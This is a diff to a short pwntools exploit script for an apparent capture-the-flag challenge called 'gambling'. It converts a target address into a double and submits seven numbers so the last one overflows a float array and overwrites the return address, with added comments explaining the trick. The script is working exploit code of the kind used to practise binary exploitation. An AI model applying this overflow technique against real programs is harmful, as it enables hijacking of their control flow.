@@ -12,11 +12,14 @@ p = gdb.debug('./gambling', '''
 
 # p = remote('challs.umdctf.io', 31005)
 
-hex_value = 0x080492c0 << 32
-double_value = struct.unpack('<d', struct.pack('<Q', hex_value))[0]
 
-p.recvuntil(b'Enter your lucky numbers: ')
-p.sendline(f' 0 0 0 0 0 0 {double_value}'.encode())
+# program reads in seven doubles to an array of floats
+# key is to overwrite return address with target address by writing a double to the seventh position (index 6) of the array to overflow
+
+
+target_address_in_hex = 0x080492c0
+target_address_in_double = struct.unpack('<d', struct.pack('<Q', target_address_in_hex<<32))[0]
+p.sendlineafter(b"Enter your lucky numbers: ", f' 0 0 0 0 0 0 {target_address_in_double}'.encode())
 
 p.interactive()
 
